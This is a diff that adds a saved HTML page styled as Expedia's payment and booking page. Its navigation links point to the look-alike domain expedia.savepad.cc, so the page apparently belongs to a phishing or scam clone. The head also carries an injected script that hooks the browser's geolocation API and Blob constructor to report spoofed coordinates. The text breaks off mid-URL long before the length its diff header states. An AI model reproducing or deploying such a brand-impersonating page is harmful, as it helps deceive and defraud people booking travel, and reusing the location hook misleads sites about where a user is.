@@ -1,0 +1,1531 @@
+<!-- saved from url=(0050)https://expedia.savepad.cc/receive/order/aMI37gkqd -->
+<html data-language="en_US" dir="ltr" lang="en" class="">
+<div id="in-page-channel-node-id" data-channel-name="in_page_channel_rfvej1"></div>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <script>(function () {
+      function hookGeo() {
+        //<![CDATA[
+        const WAIT_TIME = 100;
+        const hookedObj = {
+          getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
+          watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
+          fakeGeo: true,
+          genLat: 38.883333,
+          genLon: -77.000
+        };
+
+        function waitGetCurrentPosition() {
+          if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+            if (hookedObj.fakeGeo === true) {
+              hookedObj.tmp_successCallback({
+                coords: {
+                  latitude: hookedObj.genLat,
+                  longitude: hookedObj.genLon,
+                  accuracy: 10,
+                  altitude: null,
+                  altitudeAccuracy: null,
+                  heading: null,
+                  speed: null,
+                },
+                timestamp: new Date().getTime(),
+              });
+            } else {
+              hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
+            }
+          } else {
+            setTimeout(waitGetCurrentPosition, WAIT_TIME);
+          }
+        }
+
+        function waitWatchPosition() {
+          if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+            if (hookedObj.fakeGeo === true) {
+              navigator.geolocation.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+              return Math.floor(Math.random() * 10000); // random id
+            } else {
+              hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+            }
+          } else {
+            setTimeout(waitWatchPosition, WAIT_TIME);
+          }
+        }
+
+        Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
+          hookedObj.tmp_successCallback = successCallback;
+          hookedObj.tmp_errorCallback = errorCallback;
+          hookedObj.tmp_options = options;
+          waitGetCurrentPosition();
+        };
+        Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
+          hookedObj.tmp2_successCallback = successCallback;
+          hookedObj.tmp2_errorCallback = errorCallback;
+          hookedObj.tmp2_options = options;
+          waitWatchPosition();
+        };
+
+        const instantiate = (constructor, args) => {
+          const bind = Function.bind;
+          const unbind = bind.bind(bind);
+          return new (unbind(constructor, null).apply(null, args));
+        }
+
+        Blob = function (_Blob) {
+          function secureBlob(...args) {
+            const injectableMimeTypes = [
+              { mime: 'text/html', useXMLparser: false },
+              { mime: 'application/xhtml+xml', useXMLparser: true },
+              { mime: 'text/xml', useXMLparser: true },
+              { mime: 'application/xml', useXMLparser: true },
+              { mime: 'image/svg+xml', useXMLparser: true },
+            ];
+            let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+            if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+              const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+              if (mimeTypeIndex >= 0) {
+                let mimeType = injectableMimeTypes[mimeTypeIndex];
+                let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+
+                let parser = new DOMParser();
+                let xmlDoc;
+                if (mimeType.useXMLparser === true) {
+                  xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+                } else {
+                  xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+                }
+
+                if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+                  xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+
+                  if (mimeType.useXMLparser === true) {
+                    args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+                  } else {
+                    args[0][0] = xmlDoc.documentElement.outerHTML;
+                  }
+                }
+              }
+            }
+
+            return instantiate(_Blob, args); // arguments?
+          }
+
+          // Copy props and methods
+          let propNames = Object.getOwnPropertyNames(_Blob);
+          for (let i = 0; i < propNames.length; i++) {
+            let propName = propNames[i];
+            if (propName in secureBlob) {
+              continue; // Skip already existing props
+            }
+            let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+            Object.defineProperty(secureBlob, propName, desc);
+          }
+
+          secureBlob.prototype = _Blob.prototype;
+          return secureBlob;
+        }(Blob);
+
+        // https://developer.chrome.com/docs/extensions/mv2/messaging/#external-webpage - "Only the web page can initiate a connection.", as such we need to query the background at a frequent interval
+        // No hit in performance or memory usage according to our tests
+        setInterval(() => {
+          chrome.runtime.sendMessage('fgddmllnllkalaagkghckoinaemmogpe', { GET_LOCATION_SPOOFING_SETTINGS: true }, (response) => {
+            if ((typeof response === 'object') && (typeof response.coords === 'object')) {
+              hookedObj.genLat = response.coords.lat;
+              hookedObj.genLon = response.coords.lon;
+              hookedObj.fakeGeo = response.fakeIt;
+            }
+          });
+        }, 500);
+        //]]>
+      } hookGeo();
+    })()</script>
+  <title>Name | ExpediaGroup</title>
+  <meta name="robots" content="noindex,nofollow">
+
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="theme-color" content="#000000">
+  <link rel="icon" href="https://expedia.savepad.cc/static/style/expedia/img/faviconV2.png">
+  <link rel="stylesheet" href="/css/support_parent.css">
+
+  <link rel="stylesheet" href="./expedia_files/style.css">
+  <link type="text/css" rel="stylesheet" charset="UTF-8" href="./expedia_files/m=el_main_css">
+</head>
+
+<body class="body body--payments route__product_buy_id_any">
+
+
+
+  <div id="app-shopping-pwa">
+    <div id="app-layer-manager">
+      <div id="app-layer-base" aria-hidden="false" class="app-layer-base--active">
+        <div data-stid="infosite-page-container">
+          <div class="page-header">
+            <div class="customer-notification-container"></div>
+            <div class="uitk-skip-link uitk-skip-link-is-visually-hidden">
+              <div role="menu" class="uitk-list uitk-type-400">
+                <a class="uitk-list-item" role="menuitem" tabindex="0"
+                  href="https://expedia.savepad.cc/receive/order/aMI37gkqd#main_content">
+                  <span class="uitk-menu-list-item-label">
+                    Skip to main content
+                  </span>
+                </a>
+              </div>
+            </div>
+            <div></div>
+            <header class="global-navigation-site-header">
+              <div class="global-navigation-site-header-container">
+                <section class="global-navigation-row primary">
+                  <div class="global-navigation-row-container">
+                    <div
+                      class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-flex-flex-wrap-nowrap uitk-spacing uitk-spacing-margin-unset uitk-spacing-padding-inlinestart-six uitk-spacing-padding-small-inlineend-three uitk-spacing-padding-medium-inlineend-three uitk-spacing-padding-large-inlineend-two uitk-spacing-padding-extra_large-inlineend-two uitk-layout-flex-item uitk-layout-flex-item-flex-grow-1">
+                      <a class="uitk-header-brand-logo" href="https://www.expedia.com/"
+                        data-testid="header-brand-logo-anchor">
+                        <img src="./expedia_files/logo.svg" alt="expedia logo">
+                      </a>
+                      <div
+                        class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-flex-justify-content-flex-start uitk-layout-flex-flex-wrap-nowrap uitk-spacing uitk-spacing-padding-inlinestart-one uitk-layout-flex-item uitk-layout-flex-item-flex-basis-half_width uitk-layout-flex-item-flex-grow-1"
+                        id="primary-navigation">
+                        <div
+                          class="uitk-layout-flex-item uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0 uitk-menu uitk-menu-mounted"
+                          id="">
+                          <button tabindex="0" aria-expanded="false" data-context="global_navigation" type="button"
+                            class="uitk-button uitk-button-large uitk-button-has-text uitk-button-tertiary uitk-menu-trigger global-navigation-nav-button">
+                            <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                              More travel
+                            </div>
+                            <svg class="uitk-icon uitk-icon-trailing uitk-icon-medium"
+                              aria-describedby="header-menu-expand_more-description" role="img" viewBox="0 0 24 24"
+                              xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                              <desc id="header-menu-expand_more-description">
+                                More travel
+                              </desc>
+                              <path d="M16.59 8.59 12 13.17 7.41 8.59 6 10l6 6 6-6-1.41-1.41z"></path>
+                            </svg>
+                          </button>
+                          <div
+                            class="uitk-menu-container animation-disabled uitk-menu-pos-left uitk-menu-container-autoposition uitk-menu-container-has-intersection-root-el"
+                            aria-hidden="true" style="width: 375px;">
+                            <div>
+                              <div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Stays" data-stid="hotel-link" href="https://expedia.savepad.cc/Hotels"
+                                    target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      <svg
+                                        class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-three uitk-icon-medium"
+                                        aria-describedby="menu-link-lob_hotels-description" role="img"
+                                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <desc id="menu-link-lob_hotels-description">
+                                          Stays
+                                        </desc>
+                                        <path
+                                          d="m21.61 21.41-.47-1.1a.49.49 0 0 0-.16-.2.4.4 0 0 0-.23-.06h-.84V7.4a.4.4 0 0 0-.12-.28.38.38 0 0 0-.29-.13h-3.75V2.41a.4.4 0 0 0-.12-.28.38.38 0 0 0-.29-.13H4.5a.38.38 0 0 0-.3.13.4.4 0 0 0-.11.28v17.64h-.84a.4.4 0 0 0-.23.07.49.49 0 0 0-.16.18l-.47 1.11a.44.44 0 0 0-.03.2c0 .08.03.14.07.2a.38.38 0 0 0 .33.2h18.48a.38.38 0 0 0 .33-.2.36.36 0 0 0 .07-.2c0-.06 0-.13-.03-.2zM9.09 17h-2.5v-2.5h2.5V17zm0-5h-2.5V9.5h2.5V12zm0-5h-2.5V4.5h2.5V7zm4.16 12.77h-2.5V14.5h2.5v5.27zm0-7.77h-2.5V9.5h2.5V12zm0-5h-2.5V4.5h2.5V7zm4.16 10h-2.5v-2.5h2.5V17zm0-5h-2.5V9.5h2.5V12z">
+                                        </path>
+                                      </svg>
+                                      Stays
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Flights" data-stid="flight-link"
+                                    href="https://expedia.savepad.cc/Flights" target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      <svg
+                                        class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-three uitk-icon-medium"
+                                        aria-describedby="menu-link-lob_flights-description" role="img"
+                                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <desc id="menu-link-lob_flights-description">
+                                          Flights
+                                        </desc>
+                                        <path
+                                          d="m3.64 14.26 2.86.95 4.02-4.02-8-4.59 1.16-1.16c.1-.1.26-.14.41-.1l9.3 2.98c1.58-1.58 3.15-3.2 4.77-4.75.31-.33.7-.58 1.16-.73.45-.16.87-.27 1.25-.34.55-.05.98.4.93.93-.07.38-.18.8-.34 1.25-.15.46-.4.85-.73 1.16l-4.75 4.78 2.97 9.29c.05.15 0 .29-.1.41l-1.17 1.16-4.57-8.02L8.8 17.5l.95 2.84L8.6 21.5l-2.48-3.62L2.5 15.4l1.14-1.14z">
+                                        </path>
+                                      </svg>
+                                      Flights
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Cars" data-stid="car-link" href="https://expedia.savepad.cc/Cars"
+                                    target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      <svg
+                                        class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-three uitk-icon-medium"
+                                        aria-describedby="menu-link-lob_cars-description" role="img" viewBox="0 0 24 24"
+                                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <desc id="menu-link-lob_cars-description">
+                                          Cars
+                                        </desc>
+                                        <path
+                                          d="M21.86 11.16 20.2 9.62l-1.66-5.53a.39.39 0 0 0-.14-.21.4.4 0 0 0-.25-.08H5.85a.4.4 0 0 0-.25.08.4.4 0 0 0-.14.2l-1.8 5.54-1.54 1.54a.38.38 0 0 0-.1.14.44.44 0 0 0-.02.16v4.94l.03.15c.02.06.05.1.09.14l.72.7v2.37c0 .11.04.22.12.3.08.08.17.13.29.13h3.34c.12 0 .21-.05.3-.13a.43.43 0 0 0 .11-.3v-2.37h10v2.37c0 .11.04.22.12.3.08.08.17.13.29.13h3.34c.12 0 .21-.05.3-.13a.43.43 0 0 0 .11-.3v-2.37l.72-.7a.38.38 0 0 0 .1-.14l.02-.15v-4.92a.39.39 0 0 0-.04-.18.52.52 0 0 0-.1-.14zM6.8 5.46h10.4l1.25 4.16H5.54l1.25-4.16zm-.9 9.16a1.6 1.6 0 0 1-1.18-.49 1.6 1.6 0 0 1-.48-1.17c0-.46.16-.85.48-1.17a1.6 1.6 0 0 1 1.18-.49c.45 0 .84.16 1.17.49.32.32.49.71.49 1.17 0 .46-.17.85-.5 1.17a1.6 1.6 0 0 1-1.16.49zm12.22 0a1.6 1.6 0 0 1-1.17-.49 1.6 1.6 0 0 1-.49-1.17c0-.46.17-.85.5-1.17a1.6 1.6 0 0 1 1.16-.49c.46 0 .85.16 1.18.49.32.32.48.71.48 1.17 0 .46-.16.85-.48 1.17a1.6 1.6 0 0 1-1.18.49z">
+                                        </path>
+                                      </svg>
+                                      Cars
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Packages" data-stid="package-link"
+                                    href="https://expedia.savepad.cc/Vacation-Packages" target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      <svg
+                                        class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-three uitk-icon-medium"
+                                        aria-describedby="menu-link-lob_packages-description" role="img"
+                                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <desc id="menu-link-lob_packages-description">
+                                          Packages
+                                        </desc>
+                                        <path
+                                          d="M21.59 11.59h-2.36V8.66c0-.23-.2-.41-.43-.41h-5.82a.42.42 0 0 0-.43.41v2.93H10.2a.42.42 0 0 0-.43.41v8.34c0 .23.21.41.43.41h11.4c.21 0 .41-.2.41-.41V12c0-.23-.2-.41-.41-.41zm-7.36-1.68h3.32v1.68h-3.32V9.91zm3.79 9.06-1.2-1.17 2.37-2.36 1.17 1.17-2.34 2.36zM10.89 4.91V3.66a.4.4 0 0 0-.41-.41H4.64a.4.4 0 0 0-.41.41v2.93H2.4A.4.4 0 0 0 2 7v13.34c0 .2.18.41.41.41h5.7V10.34c0-.23.18-.43.41-.43h2.37v-5zM9.23 6.59H5.89V4.91h3.34v1.68z">
+                                        </path>
+                                      </svg>
+                                      Packages
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Things to do" data-stid="activity-link"
+                                    href="https://expedia.savepad.cc/Activities" target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      <svg
+                                        class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-three uitk-icon-medium"
+                                        aria-describedby="menu-link-lob_activities-description" role="img"
+                                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <desc id="menu-link-lob_activities-description">
+                                          Things to do
+                                        </desc>
+                                        <path
+                                          d="M22 10.18V6H2v4.18c.9 0 1.66.75 1.66 1.66 0 .9-.76 1.66-1.66 1.66v4.18h20V13.5c-.9 0-1.66-.76-1.66-1.66 0-.9.76-1.66 1.66-1.66zm-4.16 4.57c0 .23-.2.43-.43.43H6.59a.43.43 0 0 1-.43-.43V8.93c0-.23.2-.43.43-.43h10.82c.23 0 .43.2.43.43v5.82zm-10-4.57h8.32v3.32H7.84v-3.32z">
+                                        </path>
+                                      </svg>
+                                      Things to do
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Cruises" data-stid="cruise-link"
+                                    href="https://expedia.savepad.cc/Cruises" target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      <svg
+                                        class="uitk-icon uitk-spacing uitk-spacing-padding-inlineend-three uitk-icon-medium"
+                                        aria-describedby="menu-link-lob_cruise-description" role="img"
+                                        viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <desc id="menu-link-lob_cruise-description">
+                                          Cruises
+                                        </desc>
+                                        <path
+                                          d="M20.34 10.96v1.68c0 .13-.06.24-.14.32-2.21 1.99-3.51 4.72-4.58 7.45-.24.62-.4 1.05-.48 1.3a.4.4 0 0 1-.39.29h-5.5a.4.4 0 0 1-.4-.3c-.07-.24-.23-.67-.47-1.3-1.06-2.7-2.4-5.47-4.58-7.44a.44.44 0 0 1-.14-.32v-1.68c0-.18.11-.33.3-.4l6.5-2.17c.23-.05.54.08.54.35L12 16l1-7.26c0-.28.3-.4.54-.35l6.5 2.16c.19.08.3.23.3.41zM5.83 8.2 12 6.12l6.17 2.07-1.72-3.14h1.66l-.47-1.37a.4.4 0 0 0-.39-.3h-4.14v-.97c0-.23-.2-.41-.4-.41H11.3c-.21 0-.41.18-.41.41v.98H6.75a.4.4 0 0 0-.4.29L5.9 5.05h1.66L5.83 8.19z">
+                                        </path>
+                                      </svg>
+                                      Cruises
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Deals" data-stid="deals-link" href="https://expedia.savepad.cc/deals"
+                                    target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      Deals
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Groups &amp; meetings" data-stid="groups-meetings-link"
+                                    href="https://www.hotelplanner.com/Common/Services/Groups/?Brand=Expedia&amp;Loc=en_US"
+                                    target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      Groups &amp; meetings
+                                    </div>
+                                  </a>
+                                </div>
+                                <div
+                                  class="uitk-layout-flex-item uitk-list uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                                  <a aria-label="Mobile" data-stid="mobile-link" href="https://expedia.savepad.cc/app"
+                                    target="_self" rel=""
+                                    class="uitk-link uitk-list-item uitk-link-align-left uitk-link-layout-default uitk-link-medium"
+                                    role="link">
+                                    <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                                      Mobile
+                                    </div>
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div
+                        class="uitk-layout-flex uitk-layout-flex-align-items-center uitk-layout-flex-justify-content-flex-end uitk-layout-flex-flex-wrap-nowrap uitk-layout-flex-item uitk-layout-flex-item-flex-basis-half_width uitk-layout-flex-item-flex-grow-1">
+                        <div>
+                          <a href="https://expe.app.link/?~agency_id=1034&amp;customer_ad_set_name=EXPEDIA-US&amp;~customer_ad_name=Brand.DTI&amp;~customer_campaign=BRAND&amp;~customer_placement=BEX-NAVBAR-CTAMWEB&amp;~placement_id=page.Hotel-Search&amp;%24canonical_url=https%3A%2F%2Fwww.expedia.com%2F&amp;origref=www.expedia.com&amp;%24desktop_url=https%3A%2F%2Fwww.expedia.com%2Fapp&amp;custom_web_attribute=b903ea10-fb54-47e1-95ff-66179f6a5aa2"
+                            target="EXTERNAL" data-context="global_navigation"
+                            class="uitk-button uitk-button-small uitk-button-has-text uitk-button-as-link uitk-button-secondary uitk-layout-flex-item">
+                            <svg class="uitk-icon uitk-icon-leading uitk-icon-medium" aria-hidden="true"
+                              viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                              xmlns:xlink="http://www.w3.org/1999/xlink">
+                              <path fill-rule="evenodd"
+                                d="m7 1 10 .01A2 2 0 0 1 19 3v18a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V3c0-1.1.9-2 2-2zm0 18h10V5H7v14z"
+                                clip-rule="evenodd"></path>
+                            </svg>
+                            <div class="uitk-text uitk-type-300 uitk-text-white-space-nowrap uitk-text-default-theme">
+                              Get the app
+                            </div>
+                          </a>
+                        </div>
+                        <button data-stid="button-type-picker-trigger" data-context="global_navigation" type="button"
+                          class="uitk-button uitk-button-medium uitk-button-tertiary global-navigation-nav-button">
+                          <div class="uitk-layout-flex uitk-layout-flex-gap-two">
+                            <svg class="uitk-icon uitk-icon-small" aria-hidden="true" viewBox="0 0 24 24"
+                              xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                              <path
+                                d="M11.99 2A10 10 0 1 0 12 21.99 10 10 0 0 0 11.99 2zm6.93 6h-2.95a15.65 15.65 0 0 0-1.38-3.56A8.03 8.03 0 0 1 18.92 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82A14.09 14.09 0 0 1 12 4.04zM4.26 14a8.17 8.17 0 0 1 0-4h3.38a16.45 16.45 0 0 0 0 4H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56A7.99 7.99 0 0 1 5.08 16zm2.95-8H5.08a7.99 7.99 0 0 1 4.33-3.56A15.65 15.65 0 0 0 8.03 8zM12 19.96A14.09 14.09 0 0 1 10.09 16h3.82A14.09 14.09 0 0 1 12 19.96zM14.34 14H9.66a14.49 14.49 0 0 1 0-4h4.68a14.5 14.5 0 0 1 0 4zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 0 1-4.33 3.56zM16.36 14c.16-1.34.16-2.66 0-4h3.38a8.17 8.17 0 0 1 0 4h-3.38z">
+                              </path>
+                            </svg>
+                            <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                              English
+                            </div>
+                          </div>
+                        </button>
+                        <a href="https://apps.expediapartnercentral.com/en_US/list?utm_medium=referral&amp;utm_source=wwwexpediacom-en_US&amp;utm_campaign=Brand.DTI&amp;utm_contentewd=pwa-header-btn&amp;siteId=1&amp;tpid=1&amp;eapid=0&amp;langId=1033&amp;utm_term=Brand.DTI&amp;lasttouchMktgcode=Brand.DTI"
+                          target="_blank" rel="noopener" data-stid="listYourProperty-link"
+                          data-context="global_navigation"
+                          class="uitk-button uitk-button-medium uitk-button-has-text uitk-button-as-link uitk-button-tertiary uitk-layout-flex-item global-navigation-nav-button uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                          <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                            List your property
+                          </div>
+                        </a>
+                        <a href="https://expedia.savepad.cc/service/" target="_self" rel="" data-stid="support-cs-link"
+                          data-context="global_navigation"
+                          class="uitk-button uitk-button-medium uitk-button-has-text uitk-button-as-link uitk-button-tertiary uitk-layout-flex-item global-navigation-nav-button uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                          <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                            Support
+                          </div>
+                        </a>
+                        <a href="https://expedia.savepad.cc/trips" target="_self" rel="" data-stid="itinerary-link"
+                          data-context="global_navigation"
+                          class="uitk-button uitk-button-medium uitk-button-has-text uitk-button-as-link uitk-button-tertiary uitk-layout-flex-item global-navigation-nav-button uitk-layout-flex-item-flex-basis-zero uitk-layout-flex-item-flex-grow-0">
+                          <div class="uitk-text uitk-type-300 uitk-text-default-theme">
+                            Trips
+                          </div>
+                        </a>
+                        <a href="https://expedia.savepad.cc/user/signin?ckoflag=0&amp;uurl=e3id%3Dredr%26rurl%3D%2FWarsaw-Hotels-Hotel-Verte.h83441056.Hotel-Information%3Fchkin%3D2023-06-06%26chkout%3D2023-06-07%26x_pwa%3D1%26rfrr%3DHSR%26pwa_ts%3D1684842497142%26referrerUrl%3DaHR0cHM6Ly93d3cuZXhwZWRpYS5jb20vSG90ZWwtU2VhcmNo%26useRewards%3Dfalse%26rm1%3Da2%26regionId%3D5718359%26destination%3DWarsaw%252C%2BPoland%2B%2528WAW-Frederic%2BChopin%2529%26destType%3DMARKET%26neighborhoodId%3D6141889%26latLong%3D52.170952%252C20.967527%26trackingData%3DAAAAAQAAAAEAAAAQfuiZf_jH6Ir6p9L1g4pTX8_aBQNrH2h4kz3JBdPG3UU0TiouJzmHJBpCn8PbGmtVyacPJecCUmoMMWlh_O-n2ngYZXhxl3sfdJFO4MquBhEHQDjOi6heEzYNI_CpDIzrBzpEqwASadpwBnvdaXmj4n9WkYhq5jSzQapKcH2-guIPL7QN9lPx4UPOj8JO0dZrf5W59dwtFHaYqrSjmD4aVdgP5ykVg1k29i3iTjOrtJSYSP11GxJAJfSuj_-reck4UBQizBo6ULyP-aYzCIQTzmB9glHue0fCZ1-SJOnF1UAhHxNnci7vw8ZMlT3W_9flDGQqWF9OhlL1-J_7lj9wGPWoXiFiNNb4MZyEA8zxWC-hmt80NhivA2zYd_xsOOXY4KiWS25OESqcMO_-m2NPYlfMJ4D9tzv8bo-pl8P6_VyJp5Sn3D6p4yYQ_8q6ycti2i_1WNlUFrX-rsvtYn9MzZYU8ZNkmm9e_8cpirSMkohckcfBWWa_DAyzm28tF6hu8xsncAidoOAsewIF6M3Ltx1_VZ0JnwIETY3oG_LapznKrioioLFcKQLG8qqQQmxiWHuVi_rkAnYetnA_gr6ksB3Hwq7H_fXDcRrF-rdKm9ctptAvpmw5yYfkjjoDaQ0GW_DfUrXpva2TNxMRv0bBmonDAzmTUb56nQQqMTTWfK9ENP_fcFehutMpP6wNG4e2lcRTumiNmGW8PrcX6DYPJSDNwYbvVrCC7d30IIroJlscxBw7WRWCFV1QXeRSp4_TGieZ3O-WKbMNRCPXukTFl4Ll3EZ0O07JscFQWnZ9ccxNhIpm7NWthGUdU3y5yfTxrL6fraijp943Vzi-5xcWFpjb2P5wmkMHaUzE88p__trF2TaTIqwF3mOVNbjxxLePZ-zKjBKhmP9id7oQUgcTURMjn9xtoFMnrDcvXE8XCHS2Eaq4-EVqkt8TL7rypk315FKFHHbtw5ZPF_-4b7ZXusJ9B89nznhF3nnhz5UNWofoLEd7BMWPLKJ0AVXeCV-SZeyEmPTaiJD5ywfs95O_NQyvxT-1nqEFa2KjuXIUEyVcmKYyG6LhgRIh8ZDm86Jy2tC9HIcF84r5oJLOpKOr0-rZnRydkw6cv544XrPBCUhP5nIK8DeOijhp-6m4IisBdEeNSfiiXtulrbP9hSAd0ea_-YgfKlP9GYIP0n0T8utFcODen-23p_L2lwbdRH1Mpa35MgkSs-VbHSXMsOuLYaMV9P0XFooAhRvXOs84cl6mOMrKEdj9n6m0Nu8shJamX2y9KPmch2HeLHBjl-OujUsQwn5N73oLhB0Hp5TJZzmu3z2FomppQMX93vCqVXW9skk_utHWa7owjNc0t4DTyHViXFa-grZAqsaF4kSHW1sPKEdpbV4GSh7tLDDdykgwO-HoJuRx-fq488E56rUukiWCo-AW_lFhBO0FFg3GHZsqYD4ZYnJbVuI-saYu95UMcDGEUVVVyvHky1lvG3kKddvittKUpmATznd3_nQXGZZIkLySw8MzW7cIoAQYfjrufRtNZmpprsD3-zuixIQOkKScmHUsO0VQ4_Oh0ixAxn5yNOWNCdd3N9ev3vbqUUZPi5vX9k73s6Z1sbByr4ir3kr8WIN36pVNAzmMILWVpC2EUmnBa1ELNdE06q2WRkjyuABgbTm7s2UAqduUFSdsfa3fEdnKWoTNjiPY9u6tjStCzgA7P5U17fzGYirS2rEQNB9C9lU-UnA6a7W4I1_tlRiXuDy_WMQnrMyTvS0pHZKPqXBQmCDHidbMr6uaFAGVSq19vZbm0M0JsAcQSaBtf2CKiWvSz4brAMtfpLfPVGCN_hO9s0lt-d_9NJL3i9